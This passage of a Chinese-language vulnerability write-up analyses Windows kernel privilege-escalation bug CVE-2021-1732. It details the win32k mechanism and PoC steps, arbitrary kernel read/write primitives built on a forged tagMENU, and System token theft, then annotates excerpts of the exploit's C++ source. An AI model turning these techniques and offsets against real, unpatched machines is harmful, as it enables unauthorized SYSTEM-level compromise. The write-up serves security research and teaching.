<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[用户态]</span><br><span class="line">- CreateWindowEx 实际调用 user32!CreateWindowExW</span><br><span class="line">- user32!CreateWindowExW 调用 user32!CreateWindowInternal</span><br><span class="line">- user32!CreateWindowInternal 中调用 user32!VerNtUserCreateWindowEx</span><br><span class="line">- user32!VerNtUserCreateWindowEx 中调用 win32u!NtUserCreateWindowEx</span><br><span class="line">- win32u!NtUserCreateWindowEx 中通过系统调用进入内核态，调用 win32kfull!NtUserCreateWindowEx</span><br><span class="line">[内核态]</span><br><span class="line">- win32kfull!NtUserCreateWindowEx 中调用 win32kfull!xxxCreateWindowEx</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/1.png" alt="1"></p>
<p>xxxCreateWindowEx 506 行调用 win32kbase!HMAllocObject 创建了一个 tagWND 结构体并返回其指针：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/2.png" alt="2"></p>
<p>521 行设置 ptagWNDk-&gt;pExtraBytes 初值为 0（*(ptagWND + 0x28) 为 ptagWNDk）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/3.png" alt="3"></p>
<p>从 821、822 行可以看出，当 ptagWNDk-&gt;cbWndExtra 不为 0 时，会调用 win32kfull!xxxClientAllocWindowClassExtraBytes 来设置 ptagWNDk-&gt;pExtraBytes：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/4.png" alt="4"></p>
<p>821 行的不等号重载（0xA1 - 0x79 = 0x28）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/5.png" alt="5"></p>
<p>win32kfull!xxxClientAllocWindowClassExtraBytes 实现：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/6.png" alt="6"></p>
<p>阅读代码后，不难发现：</p>
<ul>
<li>22 行：通过 nt!KeUserModeCallback<sup>[11]</sup> 回调记录在 <strong>PEB.KernelCallbackTable 表中第 123 项</strong> 的用户层函数，该项是 <strong>user32!_xxxClientAllocWindowClassExtraBytes</strong> 函数的指针</li>
<li>26 行：user32!_xxxClientAllocWindowClassExtraBytes <strong>返回信息的长度应该为 0x18 字节</strong></li>
<li>29 行：存储返回信息的地址需小于 MmUserProbeAddress（0x7fffffff0000）</li>
<li>31 行：<strong>返回信息的第一个指针类型指向在用户态申请的用户堆空间</strong></li>
<li>34 行：调用 ProbeForRead 验证申请的用户堆地址 + 长度是否小于 MmUserProbeAddress（0x7fffffff0000）</li>
<li>32、35 行：xxxClientAllocWindowClassExtraBytes 返回用户堆空间地址</li>
</ul>
<p>user32!_xxxClientAllocWindowClassExtraBytes 函数：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/7.png" alt="7"></p>
<p>该回调函数所做的事情就是调用 ntdll!RtlAllocateHeap 申请 cbWndExtra 大小的用户堆空间，并将申请到的堆地址作为返回信息的第一个 8 字节，<strong>调用 ntdll!NtCallbackReturn 修正堆栈后重新返回内核层执行</strong>。</p>
<p>win32kfull!xxxClientAllocWindowClassExtraBytes 返回后，ptagWNDk-&gt;pExtraBytes 就会被赋值为申请到的用户空间堆地址：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/4.png" alt="4"></p>
<p>以上过程用 iamelli0t 博客<sup>[12]</sup>的一张图来总结：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/8.png" alt="8"></p>
<br>

<blockquote>
<p>模式 2 - 在系统空间桌面堆中（offset 间接寻址模式）</p>
</blockquote>
<p>在该模式下想要赋值 pExtraBytes，须在用户态调用未公开的 user32!ConsoleControl（或 <strong>win32u!NtUserConsoleControl</strong>），调用栈：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/9.png" alt="9"></p>
<p>win32kfull!NtUserConsoleControl 函数：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/10.png" alt="10"></p>
<p>由上图可知，要想调用 xxxConsoleControl，需满足：</p>
<ul>
<li>14 行：第一个参数（<strong>功能号</strong>）不大于 6</li>
<li>16 行：第三个参数（<strong>参数信息的长度</strong>）不大于 0x18</li>
</ul>
<p>win32kfull!xxxConsoleControl 根据传入的功能号进行不同的操作，一共有 6 种功能（功能号为 1 - 6），<strong>第 6 个功能才会赋值 pExtraBytes</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/11.png" alt="11"></p>
<p>由上图分析可得，功能 6 调用 DesktopAlloc 在内核空间桌面堆中分配窗口扩展内存，计算已分配的扩展内存地址到内核桌面堆基址的偏移量，并将偏移量保存到 tagWNDk.pExtraBytes，最后修改 <code>tagWNDk.dwExtraFlag |= 0x800</code>。</p>
<br>

<h3 id="POC-攻击手法及难点解决"><a href="#POC-攻击手法及难点解决" class="headerlink" title="POC 攻击手法及难点解决"></a>POC 攻击手法及难点解决</h3><p>经过上面的分析我们已经知道：</p>
<ol>
<li>使用 CreateWindowEx 创建窗口的过程中内核会回调用户层函数 user32!_xxxClientAllocWindowClassExtraBytes，由它代为申请用户空间堆，内核用这个地址赋值 pExtraBytes 后，<strong>并未重新设置 dwExtraFlag</strong>（<code>tagWNDk.dwExtraFlag &amp;= ~0x800</code>）</li>
<li>使用 user32!ConsoleControl 的第 6 个功能，除了能赋值 pExtraBytes，还能设置 <code>tagWNDk.dwExtraFlag |= 0x800</code></li>
<li>调用 SetWindowLong 写窗口扩展内存时，如果 <code>dwExtraFlag &amp; 0x800 != 0</code>，则使用 offset 间接寻址方式写桌面堆</li>
</ol>
<p>在 POC 中，攻击者对 user32!_xxxClientAllocWindowClassExtraBytes 进行挂钩，<strong>在钩子函数中手动调用 win32u!NtUserConsoleControl</strong>，将 pExtraBytes 的解释方式从模式 1 修改为模式 2，然后调用 ntdll!NtCallbackReturn 向内核返回一个能过读写检查的可控值，用于设置 tagWNDk.pExtraBytes。最后调用 SetWindowLong 写附加空间时，就能实现基于内核空间桌面堆基址的可控偏移量越界写。</p>
<p>还是借用 iamelli0t<sup>[12]</sup> 的图来直观感受：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/poc_attack/1.png" alt="1"></p>
<p>设想是美好的，实践起来还会遇到细节上的问题 —— 上个部分所提到的 win32kfull!xxxConsoleControl 功能 6 需要传入<strong>窗口句柄</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/poc_attack/2.png" alt="2"></p>
<p>可攻击需要在 CreateWindowEx 过程里调用 user32!ConsoleControl，此时 CreateWindowEx 还没有返回窗口句柄 HWND，这就需要我们来分析 CreateWindowEx 是怎么创建的窗口句柄。其实在 <strong>3.4.1 节</strong> 我提了一下 xxxCreateWindowEx 506 行调用 win32kbase!HMAllocObject 创建了一个 tagWND 结构体并返回其指针：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/two_modes/2.png" alt="2.1"></p>
<p>窗口句柄就是在这个函数中创建并赋值到 tagWND 结构体中的，该函数首先通过 DesktopAlloc 从内核桌面堆申请存储 tagWNDk 的空间：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/poc_attack/3.png" alt="3"></p>
<p>然后选出一个<strong>窗口句柄</strong><sup>[13]</sup>并<strong>存储到 &amp;tagWNDk + 0</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/poc_attack/4.png" alt="4"></p>
<p>此外，结合上两张图可以发现 <strong>&amp;tagWNDk + 8 保存了 tagWNDk 相对于桌面堆基址的偏移</strong>。</p>
<p>幸运的是， user32!_xxxClientAllocWindowClassExtraBytes 之前，win32kbase!HMAllocObject 就已经在 win32kfull!xxxCreateWindowEx 中被调用了，我们要是能把创建的窗口句柄泄露出来就可以补全 POC 链了，问题就转化为<strong>如何泄露 tagWNDk 的内容</strong>。</p>
<p>这就不得不提起 Windows 内核利用领域使用了 10 年的一项技术 —— 通过未公开函数 user32!HMValidateHandle 泄露内核信息<sup>[14]</sup>，只要把窗口句柄传递给这个函数，它就会<strong>返回 tagWNDk 在用户空间的只读映射指针</strong>（HMAllocObject 创建了桌面堆类型句柄后，会把tagWNDk 对象放入到内核模式到用户模式的映射内存中）。此外，HMValidateHandle 函数的地址可以由 user32!IsMenu 的第一个 call 计算<sup>[14]</sup>。</p>
<p>那么泄露窗口句柄的难点就迎刃而解了，直接来看完整的 POC 思路：</p>
<ol>
<li>将 PEB.KernelCallbackTable 的第 123 项替换成自定义挂钩函数的指针</li>
<li>创建一些窗口（都属于窗口类 1），并通过 user32!HMValidateHandle 泄露这些窗口对应 tagWNDk 在用户空间的地址</li>
<li>销毁在步骤 2 中创建的部分窗口，使得桌面堆能回收这些窗口对象所占用的空间。再使用与窗口类 1 cbWndExtra 不同的窗口类 2 创建一个新窗口，这个新窗口的 tagWNDk 对象可能会<strong>使用之前释放掉的空间</strong>。因此，通过在自定义挂钩函数中使用窗口类 2 的 cbWndExtra 搜索先前泄露的 tagWNDk 对象用户空间地址，便可以找到新窗口的 tagWNDk 在用户空间的地址，读取第一个 8 字节即可泄露窗口句柄。</li>
<li>在自定义挂钩函数中调用 user32!ConsoleControl 来修改新窗口 <code>tagWNDk.dwExtraFlag |= 0x800</code></li>
<li>在自定义挂钩函数中调用 ntdll!NtCallbackReturn 将可控的虚假偏移量分配给新窗口的 tagWNDk.pExtraBytes</li>
<li>调用 SetWindowLong 将数据写入内核空间桌面堆基址 + 可控偏移量的地址，这可能会导致超出堆范围的内存访问冲突</li>
</ol>
<p>这些步骤都会在 <strong>04 部分</strong> 体现。</p>
<br>

<h3 id="EXP-利用手法及难点解决"><a href="#EXP-利用手法及难点解决" class="headerlink" title="EXP 利用手法及难点解决"></a>EXP 利用手法及难点解决</h3><p>对于内核漏洞利用，攻击目标通常是获得 System 令牌，常见的方法如下：</p>
<ol>
<li>利用漏洞在内核空间中获得任意地址读写的原语</li>
<li>泄露一些内核对象的地址，通过 EPROCESS 链找到 System 进程</li>
<li>将 System 进程的令牌复制到攻击进程以完成权限提升</li>
</ol>
<p>我们所面临的困难主要是步骤 1 —— 如何利用”在内核空间桌面堆基地址 + 可控偏移量计算出的地址中写数据”的机会来获取内核空间任意地址读写的原语。本部分将注重逻辑分析，具体实施细节在 <strong>04 部分</strong> 。</p>
<blockquote>
<p>任意地址写</p>
</blockquote>
<p>由 <strong>3.3 节</strong> 的分析，调用 SetWindowLong 时，传递的 nIndex 必须小于 tagWNDk.cbWndExtra，若是能把该值改大，就能轻松造成内存访问越界。参考 <strong>3.5 节</strong>，tagWNDk + 8 的地方保存着该 tagWNDk 相对于桌面堆基址的偏移。结合这两点，可以构造如下的内存布局：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/1.png" alt="1"></p>
<p>首先通过漏洞将 tagWNDk2.pExtraBytes 设置为 offset 模式寻址（dwExtraFlag |= 0x800），并将其赋值为 tagWNDk0 相对于桌面堆基址的偏移（*(&amp;tagWNDk0 + 8)），于是窗口 2 的扩展内存变成了 tagWNDk0 所在的空间。对窗口 2 调用 SetWindowLong，nIndex 为 <strong>cbWndExtra 在结构体中的偏移（0xC8）</strong>，就能修改到 tagWNDk0.cbWndExtra 了，我们把它改成 0xFFFFFFFF，cbWndExtra 过小的限制就解除了！为了能通过窗口 0 的扩展内存写到窗口 1 的 tagWNDk，还需要提前使用 win32u!NtUserConsoleControl 来让窗口 0 也进入 offset 寻址模式。</p>
<p>现在对窗口 0 调用 SetWindowLongPtr，nIndex 为<strong>窗口 0 扩展内存与窗口 1 tagWNDk 的偏移 + pExtraBytes 在结构体中的偏移（0x128）</strong>，修改 tagWNDk1.pExtraBytes 为任意值。又因为 tagWNDk1.pExtraBytes 处于直接寻址模式，再对窗口 1 调用 SetWindowLongPtr 就能实现任意地址写了。</p>
<br>

<blockquote>
<p>任意地址读</p>
</blockquote>
<p>EXP 中使用 user32!GetMenuBarInfo<sup>[15]</sup> 函数与伪造的 tagMENU 结构体进行内核读取，一次可以读取16个字节，这种巧妙的手法此前未被公开过。该 API 最终会调用 win32kfull!xxxGetMenuBarInfo，并传入 4 个参数 ptagWND，idObject，idItem，&amp;mbi<sup>[16]</sup>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/2.png" alt="2"></p>
<p>结合 <strong>3.2 节</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">	0x28 ptagWNDk(kernel layer)</span><br><span class="line">		0x18 dwStyle</span><br><span class="line">		0x58 Window Rect left</span><br><span class="line">		0x5C Window Rect top</span><br><span class="line">	0x90 spMenu(tagMENU *)</span><br><span class="line">		0x00 hMenu</span><br><span class="line">		0x28 unknown1</span><br><span class="line">			0x2C cItems(for check)</span><br><span class="line">		0x40 unknown2(for check)</span><br><span class="line">		0x44 unknown3(for check)</span><br><span class="line">		0x58 rgItems</span><br><span class="line">			0x00 unknown(for exploit)</span><br><span class="line">		0x98 spMenuk</span><br><span class="line">			0x00 pSelf</span><br></pre></td></tr></table></figure>

<p>需要注意，<strong>spMenu-&gt;spMenuk-&gt;pSelf 是一个指向 spMenu 自身的指针</strong>。</p>
<p>分析 xxxGetMenuBarInfo 关键部分：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/4.png" alt="4"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/5.png" alt="5"></p>
<p>95 行的等号重载：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/6.png" alt="6"></p>
<p>可以得出分割线往上检查了：</p>
<ul>
<li>对于 GetMenuBarInfo 参数<ul>
<li>87 行：第二个参数 idObject 应为 -3</li>
<li>98、99 行：0 &lt;= 第三个参数 idItem &lt;= ptagWND-&gt;spMenu-&gt;unknown1-&gt;cItems</li>
</ul>
</li>
<li>对于 tagWNDk 结构体<ul>
<li>89 行：dwStyle 不能包含 WS_CHILD 属性</li>
</ul>
</li>
<li>对于 tagMENU 结构体<ul>
<li>105 行：unknown2 与 unknown3 不能为 0</li>
</ul>
</li>
</ul>
<p>分割线往下就是利用部分了，由 110 - 112、122 - 130、159 行可知，如果伪造的 tagMENU 结构体中 rgItems-&gt;unknown 为<strong>欲读取的地址 - 0x40</strong>，那么就能从 GetMenuBarInfo 第四个参数 pmbi 获得欲读取地址开始的 16 个字节（当然还需要减去一些已知值）。因此，我们需要伪造的 tagMENU 结构体大概长这样：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/7.png" alt="7"></p>
<p>构造好了怎么修改 ptagWND-&gt;spMenu 呢？Kernel Killer 在他的 EXP 中选择使用 SetWindowLongPtr 自带的功能来修改。其实 SetWindowLong 系列函数除了能写窗口附加空间，<strong>如果参数 nIndex 给的是负数，它们还能用于设置 tagWND 的一些字段</strong>，这些功能都是公开的，可以在微软开发文档<sup>[17]</sup> 查到：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/8.png" alt="8"></p>
<p>当 nIndex 为 GWLP_ID 时，win32kfull!xxxSetWindowLongPtr 还会调用 <strong>win32kfull!xxxSetWindowData</strong>，在其中设置 ptagWND-&gt;spMenu 为用户给定的值，并<strong>返回 spMenu 旧值</strong>（<strong>注意：dwStyle 应带有 WS_CHILD 属性</strong>）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/9.png" alt="9"></p>
<p>就算不知道 SetWindowLongPtr 有这样的功能，也能改到 ptagWND-&gt;spMenu。同 <strong>3.6.1 节</strong> 的理，对窗口 0 调用 SetWindowLongPtr，通过越界写同样能将窗口 1 的 tagWNDk.spMenu 改为自定义的值，这种情况下，SetWindowLongPtr 依旧会返回修改前的旧值：<br><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/reason_analysis/exp_exploit/11.png" alt="11"></p>
<p>无论使用哪种方式，现在我们获得了任意地址读的能力！</p>
<br>

<blockquote>
<p>泄露内核对象地址</p>
</blockquote>
<p>泄露地址的工作在上一部分已经完成了一半 —— 泄露出了旧 spMenu 的地址，由 <strong>3.2 节</strong> 又有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">	0x10 unknown</span><br><span class="line">		0x00 pTEB</span><br><span class="line">			0x220 pEPROCESS(of current process)</span><br><span class="line">	0x90 spMenu</span><br><span class="line">		0x18 unknown0</span><br><span class="line">			0x100 unknown</span><br><span class="line">				0x00 pEPROCESS(of current process)</span><br><span class="line">		0x50 ptagWND</span><br></pre></td></tr></table></figure>

<p>那么泄露当前进程 EPROCESS 地址的方式就不止一种了：</p>
<ul>
<li>通过三次任意地址读，达到 <code>**(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100)</code> 的效果（EXP 使用）</li>
<li>通过四次任意地址读，达到 <code>*(__int64 *)(**(__int64 **)(*(__int64 *)(spMenu + 0x50) + 0x10) + 0x220)</code> 的效果（攻击样本使用）</li>
</ul>
<br>

<blockquote>
<p>提升进程权限</p>
</blockquote>
<p>知道当前进程的 EPROCESS 地址后，遍历 EPROCESS-&gt;ActiveProcessLinks 链表<sup>[18]</sup>，找到 pid 为 4 的进程（System 进程），将其 Token 复制到当前的攻击进程，即可完成提权。</p>
<p>下面是将用到的 EPROCESS 字段及其偏移量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pEPROCESS</span><br><span class="line">	0x2E0 UniqueProcessId			// pid</span><br><span class="line">	0x2E8 ActiveProcessLinks.Flink	// 该字段指向下一个 EPROCESS 结构体的 ActiveProcessLinks（双向链表）</span><br><span class="line">	0x358 Token						// 令牌</span><br></pre></td></tr></table></figure>

<br>

<h2 id="EXP-阅读"><a href="#EXP-阅读" class="headerlink" title="EXP 阅读"></a>EXP 阅读</h2><p>这个部分我将按照 EXP 的程序执行流，把 <strong>03 部分</strong> 完整地串起来，各个技术点的实施细节将在这里展露无遗。</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>169 - 176 行（WinMain 入口）为本窗口程序创建了一个控制台，并将程序的标准输入、输出重定向到这个控制台，这就是为什么运行 EXP 时会有个命令行界面：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);	<span class="comment">// 告诉编译器，已经使用了参数，不必警告</span></span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);		<span class="comment">// 应该是创建项目时的模板代码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">AllocConsole</span>();		<span class="comment">// 创建一个控制台</span></span><br><span class="line">FILE* tempFile = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conin$&quot;</span>, <span class="string">&quot;r+t&quot;</span>, stdin);		<span class="comment">// 重定向程序的标准输入到控制台</span></span><br><span class="line"><span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conout$&quot;</span>, <span class="string">&quot;w+t&quot;</span>, stdout);		<span class="comment">// 重定向程序的标准输出到控制台</span></span><br></pre></td></tr></table></figure>

<p>178 - 187 行通过未公开的 ntdll!RtlGetNtVersionNumbers 函数获得 Windows 版本信息（主次版本及 OS 内部版本号），并输出到控制台：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(WINAPI* FRtlGetNtVersionNumbers)</span><span class="params">(DWORD*, DWORD*, DWORD*)</span></span>;</span><br><span class="line">DWORD dwMajorVer, dwMinorVer, dwBuildNumber = <span class="number">0</span>;</span><br><span class="line">FRtlGetNtVersionNumbers fRtlGetNtVersionNumbers = (FRtlGetNtVersionNumbers)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlGetNtVersionNumbers&quot;</span>);</span><br><span class="line"><span class="built_in">fRtlGetNtVersionNumbers</span>(&amp;dwMajorVer, &amp;dwMinorVer, &amp;dwBuildNumber);	<span class="comment">// 获得版本信息</span></span><br><span class="line">dwBuildNumber &amp;= <span class="number">0x0ffff</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Example CVE-2021-1732 Exp working in windows 10 1809(17763).\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Current system version:\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  MajorVer:&quot;</span> &lt;&lt; dwMajorVer &lt;&lt; <span class="string">&quot; MinorVer:&quot;</span> &lt;&lt; dwMinorVer &lt;&lt; <span class="string">&quot; BuildNumber:&quot;</span> &lt;&lt; dwBuildNumber &lt;&lt; std::endl;	<span class="comment">// 输出版本信息到控制台</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);		<span class="comment">// 在这里 pause 方便为后面代码的调试下断点</span></span><br></pre></td></tr></table></figure>

<p>189 - 198 获取一些未公开函数的地址，以便后面使用：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g_fNtUserConsoleControl = (FNtUserConsoleControl)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);	<span class="comment">// win32u!NtUserConsoleControl（其实用 user32!ConsoleControl 效果一样）</span></span><br><span class="line">g_fFNtCallbackReturn = (FNtCallbackReturn)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);		<span class="comment">// ntdll!NtCallbackReturn</span></span><br><span class="line"><span class="comment">// ntdll!RtlAllocateHeap</span></span><br><span class="line">g_fRtlAllocateHeap = (RtlAllocateHeap)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlAllocateHeap&quot;</span>);</span><br><span class="line"><span class="comment">// gs:[0x60] 指向进程 PEB，PEB 结构体偏移 0x58 为 KernelCallbackTable</span></span><br><span class="line">ULONG_PTR pKernelCallbackTable = (ULONG_PTR) *(ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x58</span>);</span><br><span class="line">g_fxxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>);	<span class="comment">// KernelCallbackTable 第 123 项为 user32!_xxxClientAllocWindowClassExtraBytes</span></span><br><span class="line">g_fxxxClientFreeWindowClassExtraBytes = (FxxxClientFreeWindowClassExtraBytes) * (ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3E0</span>);	<span class="comment">// 第 124 项为 user32!_xxxClientFreeWindowClassExtraBytes（调试用）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">FindHMValidateHandle</span>(&amp;fHMValidateHandle);	<span class="comment">// user32!HMValidateHandle</span></span><br></pre></td></tr></table></figure>

<p>其中 HMValidateHandle 函数地址通过 user32!IsMenu 的第一个 call 计算<sup>[14]</sup>：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FindHMValidateHandle</span><span class="params">(FHMValidateHandle *pfOutHMValidateHandle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *pfOutHMValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hUser32 = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">    PBYTE pMenuFunc = (PBYTE)<span class="built_in">GetProcAddress</span>(hUser32, <span class="string">&quot;IsMenu&quot;</span>);	<span class="comment">// user32!IsMenu</span></span><br><span class="line">    <span class="keyword">if</span> (pMenuFunc) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xe8</span> == *pMenuFunc++) &#123;		<span class="comment">// 找到第一个 call 指令(0xE8 是 call 指令的 opcode)</span></span><br><span class="line">                DWORD ulOffset = *(PINT)pMenuFunc;	<span class="comment">// call 指令的操作数是一个偏移，计算方法为（目标地址 - call 指令地址 - 5）</span></span><br><span class="line">                *pfOutHMValidateHandle = (FHMValidateHandle)(pMenuFunc + <span class="number">5</span> + (ulOffset &amp; <span class="number">0xffff</span>) - <span class="number">0x10000</span>  - ((ulOffset &gt;&gt; <span class="number">16</span> ^ <span class="number">0xffff</span>) * <span class="number">0x10000</span>) );	<span class="comment">// 计算得到 user32!HMValidateHandle 